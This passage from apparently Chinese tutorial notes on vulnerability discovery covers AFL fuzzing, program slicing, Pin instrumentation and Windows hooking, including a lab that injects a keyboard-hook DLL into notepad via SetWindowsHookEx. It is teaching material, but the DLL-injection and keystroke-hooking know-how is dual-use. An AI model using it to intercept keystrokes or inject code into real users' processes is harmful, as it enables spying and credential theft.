href="#AFL模糊测试" class="headerlink" title="AFL模糊测试"></a>AFL模糊测试</h2><p><img src="/2023/03/15/lou-dong-wa-jue-pian/26d5986914d6d2687da4a849a6d87acf.png" class="lazyload placeholder" data-srcset="/2023/03/15/lou-dong-wa-jue-pian/26d5986914d6d2687da4a849a6d87acf.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>以一个白盒模糊测试为例。</p><h3 id="创建本次实验的程序"><a href="#创建本次实验的程序" class="headerlink" title="创建本次实验的程序"></a>创建本次实验的程序</h3><p>新建文件夹demo，并创建实验的程序<code>Test.c</code>，该代码编译后得到的程序如果被传入“deadbeef”则会终止，如果传入其他字符会原样输出。<br>使用afl的编译器编译，可以使模糊测试过程更加高效。<br>命令：<code>afl-gcc -o test test.c</code></p><p>编译后会有插桩符号，使用下面的命令可以验证这一点。<br>命令：<code>readelf -s ./test | grep afl</code></p><p><img src="/2023/03/15/lou-dong-wa-jue-pian/fefb53ad23e06ec65fc9ed36fd0685d5.png" class="lazyload placeholder" data-srcset="/2023/03/15/lou-dong-wa-jue-pian/fefb53ad23e06ec65fc9ed36fd0685d5.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="创建测试用例"><a href="#创建测试用例" class="headerlink" title="创建测试用例"></a>创建测试用例</h3><p>首先，创建两个文件夹in和out，分别存储模糊测试所需的输入和输出相关的内容。<br>命令：<code>mkdir in out</code><br>然后，在输入文件夹中创建一个包含字符串“hello”的文件。<br>命令：<code>echo hello&gt; in/foo</code><br>foo就是我们的测试用例，里面包含初步字符串hello。AFL会通过这个语料进行变异，构造更多的测试用例。</p><h3 id="启动模糊测试"><a href="#启动模糊测试" class="headerlink" title="启动模糊测试"></a>启动模糊测试</h3><p>运行如下命令，开始启动模糊测试（@@表示目标程序需要从文件读取输入）：</p><p>命令：<code>afl-fuzz -i in -o out -- ./test @@</code></p><h3 id="分析crash"><a href="#分析crash" class="headerlink" title="分析crash"></a>分析crash</h3><p>观察fuzzing结果，如有crash，定位问题。</p><p><img src="/2023/03/15/lou-dong-wa-jue-pian/01dd17ced6e0b96b2a219c3146416f4a.png" class="lazyload placeholder" data-srcset="/2023/03/15/lou-dong-wa-jue-pian/01dd17ced6e0b96b2a219c3146416f4a.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><ul><li>在out文件夹的<strong>crashes子文件夹里面是产生crash的样例</strong>，hangs里面是产生超时的样例。</li><li>通常，<strong>得到crash样例后，可以将这些样例作为目标测试程序的输入，重新触发异常并跟踪运行状态</strong>，进行分析、定位程序出错的原因或确认存在的漏洞类型。</li></ul><br/><hr><h1 id="程序切片技术"><a href="#程序切片技术" class="headerlink" title="程序切片技术"></a>程序切片技术</h1><h2 id="程序切片定义"><a href="#程序切片定义" class="headerlink" title="程序切片定义"></a>程序切片定义</h2><p>程序切片旨在从程序中提取满足一定约束条件的代码片段（<u>对指定变量施加影响的代码指令，或者指令变量所影响的代码片段</u>），是一种重要的程序分解技术。</p><p><strong>程序切片可以从大规模程序中精确定位分析员所关心的代码片段</strong>，有效缓解程序规模日益增长带来的分析效率难以同步提高的问题。比如，在漏洞挖掘中，我们可以只关注可执行文件或者源代码某一行敏感函数调用相关的代码片段，来分析是否存在缓冲区溢出漏洞等。</p><p><strong>定义</strong>：给定一个切片准则<strong>C=(N, V)<strong>，其中N表示程序P中的<u>指令</u>，V表示<u>变量集</u>，程序P关于C的</strong>映射</strong>即为程序切片。换句话说，一个程序切片是由程序中的一些语句和判定表达式组成的集合。</p><p>根据计算方向的不同，程序切片可以分为前向切片和后向切片。<strong>前向切片的计算方向和程序的运行方向是一致的</strong>。</p><p><img src="/2023/03/15/lou-dong-wa-jue-pian/8529a5b07621bf16927f1e88defcb5c0.png" class="lazyload placeholder" data-srcset="/2023/03/15/lou-dong-wa-jue-pian/8529a5b07621bf16927f1e88defcb5c0.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h2 id="控制流图"><a href="#控制流图" class="headerlink" title="控制流图"></a>控制流图</h2><p>控制流图（Control Flow Graph，简称CFG）也叫控制流程图，是一个过程或程序的抽象表现，代表了一个程序执行过程中会遍历到的所有路径。</p><p><strong>控制流图</strong>：一个程序的控制流图CFG可以表示为一个四元组，形如G=(V，E，s，e)，其中V表示<strong>变量</strong>的集合，E表示<strong>边</strong>的集合，s表示控制流图的<strong>入口</strong>，e表示控制流图的<strong>出口</strong>。</p><p>程序中的每一条指令都映射为CFG上的一个结点，具有控制依赖关系的结点之间用一条边连接。</p><p><img src="/2023/03/15/lou-dong-wa-jue-pian/68d729007c860e7e99c31d393d18d9bb.png" class="lazyload placeholder" data-srcset="/2023/03/15/lou-dong-wa-jue-pian/68d729007c860e7e99c31d393d18d9bb.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>程序中的控制依赖关系有两种来源：</p><ul><li>程序上下文</li><li>控制指令</li></ul><p>控制指令对应了分支结构和循环结构，结构里面的所有指令对结构入口的控制指令存在控制依赖关系。如果一条指令不在分支结构或循环结构里面，则该指令依赖于程序的入口。</p><h2 id="程序依赖图"><a href="#程序依赖图" class="headerlink" title="程序依赖图"></a>程序依赖图</h2><p><strong>程序依赖图</strong>：(Program Dependence Graph，PDG)可以表示为一个五元组，形如G = (V, DDE, CDE, s, e)，其中V表示<strong>变量</strong>的集合，DDE表示<strong>数据依赖边</strong>的集合，CDE表示<strong>控制依赖边</strong>的集合，每条边连接了图中的两个结点，程序中的每一条指令都映射为PDG上的一个结点。s表示程序依赖图的<strong>入口结点</strong>，e表示程序依赖图的<strong>出口结点</strong>。</p><p><strong>控制依赖</strong>：表示两个基本块在程序流程上存在的依赖关系。</p><p><strong>数据依赖</strong>：表示程序中引用某变量的基本块（或者语句）对定义该变量的基本块的依赖，即是一种“<strong>定义-引用</strong>”依赖关系。</p><p><img src="/2023/03/15/lou-dong-wa-jue-pian/33bb811d47c18d11d701a7a5dadcc2b3.png" class="lazyload placeholder" data-srcset="/2023/03/15/lou-dong-wa-jue-pian/33bb811d47c18d11d701a7a5dadcc2b3.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>控制流图CFG结点之间的边只反映出了程序指令之间的部分控制依赖关系。程序依赖图PDG需要将一个函数中所有的数据依赖和控制依赖关系遍历出来。</p><h2 id="系统依赖图"><a href="#系统依赖图" class="headerlink" title="系统依赖图"></a>系统依赖图</h2><p><strong>系统依赖图</strong>（System Dependence Graph，SDG）：可以表示为一个七元组，形如G = (V,DDE, CDE, CE, TDE, s, e)，其中V<strong>变量</strong>的集合，DDE表示<strong>数据依赖边</strong>的集合，CDE表示<strong>控制依赖边</strong>的集合，CE表示<strong>函数调用边</strong>，TDE表示参数传递造成的<strong>传递依赖边</strong>的集合，结点s表示系统依赖图的<strong>入口结点</strong>，结点e表示系统依赖图的<strong>出口结点</strong>。<br>SDG在PDG的基础上进行了扩充，系统依赖图中<u>加入了对函数调用的处理</u>。</p><h1 id="程序切片方法"><a href="#程序切片方法" class="headerlink" title="程序切片方法"></a>程序切片方法</h1><h2 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h2><blockquote><p>在实际的程序调试过程中，通常程序员只关注程序的部分行为。</p></blockquote><p>切片准则包含两个要素，即<strong>切片目标变量</strong>（如变量z），以及<strong>开始切片的代码位置</strong>（如z所在的代码位置：第12行）。严格来说，程序P的切片准则是二元组&lt;n,V&gt;，其中n是程序中一条语句的编号，V是切片所关注的变量集合，该集合是P中变量的一个子集。</p><p>切片语句可以利用<strong>数据依赖</strong>和<strong>控制依赖</strong>分析方法来获取。</p><p><img src="/2023/03/15/lou-dong-wa-jue-pian/9822e2e6dca3240d7105033f4390e2d0.png" class="lazyload placeholder" data-srcset="/2023/03/15/lou-dong-wa-jue-pian/9822e2e6dca3240d7105033f4390e2d0.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>程序切片通常包括3个步骤：程序依赖关系提取、切片规则制定和切片生成。</p><ul><li><strong>程序依赖关系提取</strong>主要是从程序中提取各类消息，包括控制流和数据流信息，形成程序依赖图。</li><li><strong>切片规则制定</strong>主要是依据具体的程序分析需求设计切片准则。</li><li><strong>切片生成</strong>则主要是依据前述的切片准则选择相应的程序切片方法，然后对第一步中提取的依赖关系进行分析处理，从而生成程序切片。</li></ul><p><img src="/2023/03/15/lou-dong-wa-jue-pian/ff7a41b1ae4ceaf7dfbad646ba8357bc.png" class="lazyload placeholder" data-srcset="/2023/03/15/lou-dong-wa-jue-pian/ff7a41b1ae4ceaf7dfbad646ba8357bc.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h2 id="图可达算法"><a href="#图可达算法" class="headerlink" title="图可达算法"></a>图可达算法</h2><p>程序切片技术有多种计算方法，例如：数据流方程算法、图可达性算法、基于波动图的切片算法、基于信息流关系的切片算法等。其中，最常用和最主流的算法是<strong>数据流方程算法</strong>与<strong>图可达性算法</strong>。</p><p>图可达性算法根据程序建模的不同分为许多子类，最常用的包括基于程序依赖图的图可达性算法和基于系统依赖图的图可达性算法。</p><p>在程序依赖图PDG中，具有直接依赖关系和间接依赖关系的结点都用一条边连结，因此基于 PDG 的图可达性切片算法只需从指定结点遍历每一个具有依赖关系的结点即可，计算过程比较<u>简单直观</u>。</p><p>将基于PDG的图可达性切片过程记为PDGSlice，它的详细步骤如下：</p><ul><li><strong>输入</strong>：结点Node</li><li><strong>输出</strong>：结点集VisitedNodes </li><li>步骤1：判断Node是否在结点集VisitedNodes，结果为是，则return；结果为否，则进入步骤2； </li><li>步骤2：将Node添加到VisitedNodes中；</li><li>步骤3：在程序依赖图中<font color=red>遍历Node依赖的结点，得到结点集Pred；</font></li><li>步骤4：对于每一个pred∈Pred，<font color=red>迭代调用PDGSlice(pred)</font>。</li></ul><p><img src="/2023/03/15/lou-dong-wa-jue-pian/f19e78f74d39d5f868d5f69c9ff8b135.png" class="lazyload placeholder" data-srcset="/2023/03/15/lou-dong-wa-jue-pian/f19e78f74d39d5f868d5f69c9ff8b135.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/15/lou-dong-wa-jue-pian/0cbab25971f9fb419682e45f34aef7db.png" class="lazyload placeholder" data-srcset="/2023/03/15/lou-dong-wa-jue-pian/0cbab25971f9fb419682e45f34aef7db.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h2 id="动态切片"><a href="#动态切片" class="headerlink" title="动态切片"></a>动态切片</h2><p>从切片角度，切片分为静态程序切片、动态程序切片和条件切片等。</p><p>由于静态切片中包含了到达兴趣点的所有可能路径，而对于程序的某一次特定执行，其中的许多路径实际上是不会被执行的。</p><p>动态切片需要考虑程序的<strong>特定输入</strong>，切片准则是一个三元组(N, V, I)，其中 N 是指令集合，V 是变量集合，I 是<strong>输入集合</strong>。</p><p><img src="/2023/03/15/lou-dong-wa-jue-pian/32bcd4d1629571679661715771336dbe.png" class="lazyload placeholder" data-srcset="/2023/03/15/lou-dong-wa-jue-pian/32bcd4d1629571679661715771336dbe.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>动态切片可以看做静态切片的子集。</p><p>当图可达算法应用到动态切片中，可以<strong>通过裁剪程序依赖图</strong>来实现。</p><p>条件切片的切片准则也是一个三元组，形为C = (N, V, 𝐹V)，其中 N 和 V 的含义同静态准则相同，𝐹V是 V 中变量的<strong>逻辑约束</strong>。</p><p>静态切片和动态切片可以看做条件切片的两个特例：<u>当𝐹V中的约束条件为空时，得到的切片是静态切片；当𝐹V中的约束固定为某一特定条件时，得到的切片是动态切片</u>。</p><h1 id="程序插桩技术"><a href="#程序插桩技术" class="headerlink" title="程序插桩技术"></a>程序插桩技术</h1><h2 id="插桩概念"><a href="#插桩概念" class="headerlink" title="插桩概念"></a>插桩概念</h2><p>程序插桩，是借助往被测程序中插入操作，来实现测试目的的方法。简单地说，插桩就是在代码中<strong>插入一段我们自定义的代码</strong>，它的目的在于通过我们插入程序中的自定义的代码，得到<strong>期望得到的信息</strong>，比如程序的控制流和数据流信息，以此来实现测试或者其他目的。</p><ul><li>最简单的插桩是在程序中插入输出语句，以监测变量的取值或者状态是否符合预期。这种插桩手段在服务类应用程序、基于日志的程序调错等。</li><li><strong>断言</strong>是一种特殊的插桩，是在程序的特定部位插入语句来检查变量的特性。</li></ul><h2 id="插桩分类"><a href="#插桩分类" class="headerlink" title="插桩分类"></a>插桩分类</h2><p><strong>源代码插桩</strong>是指在被测程序运行之前，通过自动化工具或者程序员手动在需要收集信息的地方插入探针，之后重新编译运行被测程序。</p><p><strong>静态二进制插桩</strong>和源代码插桩类似，都是在程序运行之前插入探针，与源代码插桩不同是静态二进制插桩直接对程序编译之后的二进制机器码进行插桩。编写难度更大、可移植性更差。</p><p><strong>动态二进制插桩</strong>在程序运行时，直接接管被测程序并且截获其二进制指令并插入探针。插桩程序难度更大，程序运行开销也越大。</p><h2 id="Pin插桩示例"><a href="#Pin插桩示例" class="headerlink" title="Pin插桩示例"></a>Pin插桩示例</h2><p>动态二进制插桩技术被广泛的用在各个领域。为了解决动态二进制插桩程序编写难度大、抽象层次低的缺点，提高代码的重用性，人们开发了许多<font color=red>动态二进制插桩框架</font>。</p><p>Pin是Intel公司开发的动态二进制插桩框架，支持IA-32和x86-64指令集架构，支持windows和linux。</p><p>Pin可以监控程序的每一步执行，提供了丰富的API，可以在二进制程序程序运行过程中插入各种函数，比如说我们要统计一个程序<strong>执行了多少条指令</strong>，<strong>每条指令的地址</strong>等信息。</p><h3 id="安装及使用Pin"><a href="#安装及使用Pin" class="headerlink" title="安装及使用Pin"></a>安装及使用Pin</h3><blockquote><p>解压下载的Windows版本的Pin压缩包，整体文件夹结构如下所示。</p></blockquote><p><img src="/2023/03/15/lou-dong-wa-jue-pian/77772fa0784c81568c7310ff645937b7.png" class="lazyload placeholder" data-srcset="/2023/03/15/lou-dong-wa-jue-pian/77772fa0784c81568c7310ff645937b7.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>文件夹ia32和intel64包含了英特尔不同体系架构下的相关库和可执行文件，文件夹doc包含了Pin相关的用户手册、API文档等，而文件夹<code>source\tools</code>里包含了大量的<code>PinTool</code>。</p><p>Pin通过已经定义的tools或者自己开发的tool来完成对目标程序的插桩。通常，PinTool以<strong>动态链接库</strong>方式使用，即Linux下是<code>.so</code>文件，而Windows下是<code>.dll</code>文件。</p><h3 id="Pin用法"><a href="#Pin用法" class="headerlink" title="Pin用法"></a>Pin用法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pin [OPTION] [-t &lt;tool&gt; [&lt;toolargs&gt;]] -- &lt;command line&gt;</span><br><span class="line">注：&lt;command line&gt;：&lt;App EXE&gt; [App args]</span><br></pre></td></tr></table></figure><p>举例，在Linux下使用如下命令来进行动态插桩，并得到输出信息文件：</p><p>$ ./pin -t ./source/tools/…/obj-intel64/xxxx.so – TargetApp args</p><p>这里的<code>xxxx.so</code>指代所要使用的<code>Pintool</code>，如<code>inscount0.so</code>，“–”之后要输入需要运行的目标程序（TargetApp）和其相关参数（args）。默认输出结果将保存到<code>xxxx.out</code>，也可以使用在Pintool中实现函数<code>KnobOutputFile</code>后通过<code>toolargs：-o filepath</code>指定。 </p><h3 id="使用Pintool"><a href="#使用Pintool" class="headerlink" title="使用Pintool"></a>使用Pintool</h3><p>在Pin的安装文件里，在<strong>source\tools</strong>里已经定义了大量PinTool，可以编译后直接使用，也可以自己开发自己的定制的PinTool来完成特定的插桩任务。</p><ol><li><strong>Linux下编译现有Pintool</strong></li></ol><p>Linux PinTool编译在Linux下，可以使用通过以下命令可以对所有Pintool进行编译：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cd source/tools/ManualExamples</span><br><span class="line">$ make all TARGET=intel64</span><br></pre></td></tr></table></figure><p>也可以指定某个具体的Pintool工具，如inscount0：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cd source/tools/ManualExamples</span><br><span class="line">$ make inscount0.test TARGET=intel64</span><br></pre></td></tr></table></figure><p>在pin\source\tools\ManualExamples里，已经定了好了很多PinTool，这些常用的Pintool功能介绍如下表所示：</p><p><img src="/2023/03/15/lou-dong-wa-jue-pian/da4351c3ef8fb5db1a127b02e7bbb386.png" class="lazyload placeholder" data-srcset="/2023/03/15/lou-dong-wa-jue-pian/da4351c3ef8fb5db1a127b02e7bbb386.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><ol start="2"><li><strong>Inscount插桩示例</strong></li></ol><p>首先，进入source/tools/ManualExamples，对inscount0.cpp进行编译来产生其对应的动态链接库，所使用的命令为：make inscount0.test TARGET=intel64。</p><p><img src="/2023/03/15/lou-dong-wa-jue-pian/bc499c8640ee52014b593fc91d1f6540.png" class="lazyload placeholder" data-srcset="/2023/03/15/lou-dong-wa-jue-pian/bc499c8640ee52014b593fc91d1f6540.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>编写一个简单的控制台程序FirstC.c，并进行测试。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">void main()&#123;</span><br><span class="line">printf(&quot;hello world!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在Linux下编译c文件的命令为: <code>gcc –o First FirstC.c</code>。<br>然后，对First可执行程序进行程序插桩的Pin命令为：<br><code>./pin -t ./source/tools/ManualExamples/obj-intel64/inscount0.so -- ../testCPP/First</code></p><p><img src="/2023/03/15/lou-dong-wa-jue-pian/413a488b8d7bc8f21c4cafeaf18796f3.png" class="lazyload placeholder" data-srcset="/2023/03/15/lou-dong-wa-jue-pian/413a488b8d7bc8f21c4cafeaf18796f3.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>在pin-3.18路径下增加了一个输出文件<code>inscount.out</code>，文件内容如下：“Count 192994”，即<strong>对指令数进行了插桩</strong>。</p><ol start="3"><li><strong>插桩框架：打开inscout0.cpp</strong></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">ofstream OutFile; </span><br><span class="line">static UINT64 icount = 0; // 静态变量，保存运行的指令数的计数</span><br><span class="line">VOID docount() &#123; icount++; &#125; //这个函数在每条指令执行以前被调用</span><br><span class="line">     </span><br><span class="line">VOID Instruction(INS ins, VOID *v) //Pin工具每次遇到一个新指令都会调用该函数</span><br><span class="line">&#123; </span><br><span class="line">//在每个指令之前插入一个函数docount的调用，没有任何参数</span><br><span class="line">    INS_InsertCall(ins, IPOINT_BEFORE, (AFUNPTR)docount, IARG_END);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//指定输出文件为inscount.out</span><br><span class="line">KNOB&lt;string&gt; KnobOutputFile(KNOB_MODE_WRITEONCE, &quot;pintool&quot;,  &quot;o&quot;, &quot;inscount.out&quot;, &quot;specify output file name&quot;);</span><br><span class="line"> </span><br><span class="line">//当应用退出的时候调用本函数</span><br><span class="line">VOID Fini(INT32 code, VOID *v)</span><br><span class="line">&#123; </span><br><span class="line">    OutFile.setf(ios::showbase);</span><br><span class="line">    OutFile &lt;&lt; &quot;Count &quot; &lt;&lt; icount &lt;&lt; endl;</span><br><span class="line">    OutFile.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/03/15/lou-dong-wa-jue-pian/33fc15e6abf4aac31b73a489ab9c51c2.png" class="lazyload placeholder" data-srcset="/2023/03/15/lou-dong-wa-jue-pian/33fc15e6abf4aac31b73a489ab9c51c2.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><ol start="4"><li><strong>插桩模式</strong></li></ol><p><img src="/2023/03/15/lou-dong-wa-jue-pian/04e0f0371051e28de23e7ad504f7e25b.png" class="lazyload placeholder" data-srcset="/2023/03/15/lou-dong-wa-jue-pian/04e0f0371051e28de23e7ad504f7e25b.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>在各种粒度的插装函数调用时，可以在代码中添加自己的处理函数，程序被加载后，在被插装的代码运行时，自己添加的函数会被调用。</p><p><strong>指令级插桩</strong></p><p><img src="/2023/03/15/lou-dong-wa-jue-pian/aaee229c491ceb37b52e70ea9b5303b7.png" class="lazyload placeholder" data-srcset="/2023/03/15/lou-dong-wa-jue-pian/aaee229c491ceb37b52e70ea9b5303b7.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/15/lou-dong-wa-jue-pian/65864a75fdd5de9018ce6383b4950a97.png" class="lazyload placeholder" data-srcset="/2023/03/15/lou-dong-wa-jue-pian/65864a75fdd5de9018ce6383b4950a97.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h1 id="Hook技术"><a href="#Hook技术" class="headerlink" title="Hook技术"></a>Hook技术</h1><h2 id="Hook概念"><a href="#Hook概念" class="headerlink" title="Hook概念"></a>Hook概念</h2><p>Hook(钩子)，是一种过滤(或叫挂钩)消息的技术。</p><p>Hook的目的是过滤一些关键函数调用，在函数执行前，先执行自己的<strong>挂钩函数</strong>，达到监控函数调用，改变函数功能的目的。</p><p>Hook技术已经被广泛应用于安全的多个领域，比如杀毒软件的主动防御功能，涉及到<font color=red>对一些敏感API的监控</font>，就需要对这些API进行Hook；窃取密码的木马病毒，为了接收键盘的输入，需要<strong>Hook键盘消息</strong>；甚至是Windows系统及一些应用程序，在打补丁时也需要用到Hook技术。当然，Hook技术也可以用在软件分析和漏洞挖掘等领域。</p><p>Hook技术按照实现原理来分的话，可以分为两种：</p><ul><li>API Hook：拦截Windows API</li><li>消息Hook：拦截Windows 消息</li></ul><p><img src="/2023/03/15/lou-dong-wa-jue-pian/beae9352bd9084e8c535b6325e71d738.png" class="lazyload placeholder" data-srcset="/2023/03/15/lou-dong-wa-jue-pian/beae9352bd9084e8c535b6325e71d738.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>Hook方法很多，主要包括调试法和注入法。</p><h2 id="消息Hook"><a href="#消息Hook" class="headerlink" title="消息Hook"></a>消息Hook</h2><p>Windows系统建立在<strong>事件驱动机制</strong>上，整个系统通过<strong>消息传递</strong>实现的。在Windows系统里，消息Hook就是一个<strong>Windows消息的拦截机制</strong>，可以拦截单个进程的消息（线程钩子），也可以拦截所有进程的消息（系统钩子），也可以对拦截的消息进行自定义的处理： </p><ul><li>如果对于同一事件（如鼠标消息）既安装了线程钩子又安装了系统钩子，那么系统会自动<strong>先调用线程钩子，然后调用系统钩子</strong>。 </li><li>对同一事件消息可安装多个钩子处理过程，这些钩子处理过程形成了<strong>钩子链</strong>。<u>后加入的有优先控制权</u>。</li></ul><p>Windows提供了一个官方函数<code>SetWindowsHookEx</code>用于设置消息Hook，编程时只要调用该API就能简单地实现Hook，其定义如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HHOOK SetWindowsHookEx(</span><br><span class="line">int_idHook,          //hook类型</span><br><span class="line">HOOKPROC lpfn,      //hook函数</span><br><span class="line">HINSTANCE hMod,      //hook函数所属DLL的Handle</span><br><span class="line">DWORD dwThreadId  //设定要Hook的线程ID，0表示“全局钩子”(Global Hook)监视所有进程</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h3 id="基于消息Hook的DLL注入"><a href="#基于消息Hook的DLL注入" class="headerlink" title="基于消息Hook的DLL注入"></a>基于消息Hook的DLL注入</h3><p><strong>DLL注入技术</strong>是向一个正在运行的进程插入自有DLL的过程。DLL注入的目的是<font color=red>将代码放进另一个进程的地址空间中</font>，现在被广泛应用在软件分析、软件破解、恶意代码等领域，注入方法也很多，比如利用注册表注入、CreateRemoteThread远程线程调用注入等。</p><p>在Windows中，利用<code>SetWindowsHookEx</code>函数创建钩子（Hooks）可以实现DLL注入。设计实验如下：<br>编制键盘消息的Hook函数—KeyHook.dll中的KeyboardProc函数<br>通过SetWindowsHookEx创建键盘消息钩子实现DLL注入（执行DLL内部代码）</p><h4 id="第一步：编写DLL文件"><a href="#第一步：编写DLL文件" class="headerlink" title="第一步：编写DLL文件"></a>第一步：编写DLL文件</h4><p>新建一个VC 6的动态链接库工程，命名为KeyHook，添加一个代码文件KeyHook.cpp：</p><p><img src="/2023/03/15/lou-dong-wa-jue-pian/0520aaa7d2964d42f43b129d1615c9a2.png" class="lazyload placeholder" data-srcset="/2023/03/15/lou-dong-wa-jue-pian/0520aaa7d2964d42f43b129d1615c9a2.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/15/lou-dong-wa-jue-pian/f39510d5fee3ee9b4f78e3d28af7354d.png" class="lazyload placeholder" data-srcset="/2023/03/15/lou-dong-wa-jue-pian/f39510d5fee3ee9b4f78e3d28af7354d.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/15/lou-dong-wa-jue-pian/2d410a395d660409c4f86d3bccd9d551.png" class="lazyload placeholder" data-srcset="/2023/03/15/lou-dong-wa-jue-pian/2d410a395d660409c4f86d3bccd9d551.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h4 id="第二步：编写DLL注入功能的可执行文件"><a href="#第二步：编写DLL注入功能的可执行文件" class="headerlink" title="第二步：编写DLL注入功能的可执行文件"></a>第二步：编写DLL注入功能的可执行文件</h4><p>新建一个VC6的控制台程序，添加源文件HookMain.cpp如下：</p><p><img src="/2023/03/15/lou-dong-wa-jue-pian/69df7047eaf9ed30dd370c635c813f06.png" class="lazyload placeholder" data-srcset="/2023/03/15/lou-dong-wa-jue-pian/69df7047eaf9ed30dd370c635c813f06.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/15/lou-dong-wa-jue-pian/4823b32a8a8916d91ac254a91fe327d5.png" class="lazyload placeholder" data-srcset="/2023/03/15/lou-dong-wa-jue-pian/4823b32a8a8916d91ac254a91fe327d5.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h4 id="第三步：实验验证"><a href="#第三步：实验验证" class="headerlink" title="第三步：实验验证"></a>第三步：实验验证</h4><p>将<code>HookMain.exe</code>和<code>KeyHook.dll</code>放在相同目录下，运行<code>HookMain.exe</code>安装键盘消息Hook后，将实现<code>notepad.exe</code>进程的键盘消息拦截，使之无法显示在记事本中。直到输入“q”才可停止键盘Hook。</p><p><img src="/2023/03/15/lou-dong-wa-jue-pian/8304d0fbb5410b5cef6b74d450e9dd0f.png" class="lazyload placeholder" data-srcset="/2023/03/15/lou-dong-wa-jue-pian/8304d0fbb5410b5cef6b74d450e9dd0f.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h2 id="API-Hook技术"><a href="#API-Hook技术" class="headerlink" title="API Hook技术"></a>API Hook技术</h2><h3 id="API-Hook概念"><a href="#API-Hook概念" class="headerlink" title="API Hook概念"></a>API Hook概念</h3><p>API HOOK技术是<strong>对API函数进行Hook（挂钩）的技术</strong>。API HOOK的基本方法就是通过hook“接触”到需要修改的API函数入口点，<strong>改变它的地址指向</strong>新的自定义的函数。</p><p>API Hook方法多种：<u>IAT Hook</u>、<u>代码Hook</u>、<u>EAT Hook</u> </p><blockquote><p>EAT: export address table，导出地址表</p></blockquote><p><strong>IAT Hook</strong>：将输入函数地址表IAT内部的API地址更改为Hook函数地址。</p><p>优点是实现起来较简单，缺点是无法钩取不在IAT而在程序中使用的API(比如：动态加载并使用DLL时)。</p><p><strong>代码Hook</strong>：系统库（*.dll）映射到进程内存时，从中查找API的实际地址，并直接修改代码。</p><p>该方法应用范围广泛，具体实现中常通过以下方式：</p><ul><li>使用JMP指令修改起始代码</li><li>复写函数局部</li><li>仅修改必需部分的局部</li></ul><h3 id="修改起始代码示例"><a href="#修改起始代码示例" class="headerlink" 